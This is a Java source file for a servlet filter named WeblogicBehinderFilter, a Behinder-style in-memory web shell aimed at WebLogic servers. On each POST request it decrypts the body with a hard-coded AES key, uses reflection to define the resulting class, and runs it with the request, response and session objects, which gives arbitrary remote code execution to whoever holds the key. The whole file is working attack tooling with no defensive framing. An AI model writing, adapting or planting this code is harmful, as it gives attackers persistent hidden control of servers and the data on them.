package Shell;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.HashMap;

public class WeblogicBehinderFilter implements Filter {

    @Override
    public void destroy() {

    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

        try {
            if(((HttpServletRequest)request).getMethod().equals("POST")){

                HttpSession session = ((HttpServletRequest)request).getSession();
                String k = "b9ecd0aebe82a741"; //这一行为密码的md5的前16位
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));

                HashMap map = new HashMap();
                map.put("request", request);
                map.put("response", response);
                map.put("session", session);

                //取classloader
                byte[] bytecode = java.util.Base64.getDecoder().decode("yv66vgAAADQAGgoABAAUCgAEABUHABYHABcBAAY8aW5pdD4BABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADTFU7AQABYwEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAWIBAAJbQgEAClNvdXJjZUZpbGUBAAZVLmphdmEMAAUABgwAGAAZAQABVQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsAIQADAAQAAAAAAAIAAAAFAAYAAQAHAAAAOgACAAIAAAAGKiu3AAGxAAAAAgAIAAAABgABAAAAAgAJAAAAFgACAAAABgAKAAsAAAAAAAYADAANAAEAAQAOAA8AAQAHAAAAPQAEAAIAAAAJKisDK763AAKwAAAAAgAIAAAABgABAAAAAwAJAAAAFgACAAAACQAKAAsAAAAAAAkAEAARAAEAAQASAAAAAgAT");
                ClassLoader cl = (ClassLoader)Thread.currentThread().getContextClassLoader();
                java.lang.reflect.Method define = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                define.setAccessible(true);
                Class uclass = null;
                try{
                    uclass = cl.loadClass("U");
                }catch(ClassNotFoundException e){
                    uclass  = (Class)define.invoke(cl,bytecode,0,bytecode.length);
                }

                Constructor constructor =  uclass.getDeclaredConstructor(ClassLoader.class);
                constructor.setAccessible(true);
                Object u = constructor.newInstance(this.getClass().getClassLoader());
                Method Um = uclass.getDeclaredMethod("g",byte[].class);
                Um.setAccessible(true);

                //冰蝎payload
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) Um.invoke(u,evilClassBytes);
                Object a = evilclass.newInstance();
                Method b = evilclass.getDeclaredMethod("equals",Object.class);
                b.setAccessible(true);
                b.invoke(a, map);
                return;

            }
        }catch(Exception ex){
            ex.printStackTrace();

        }
        chain.doFilter(request, response);

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    public static void main(String[] args) {

    }
}

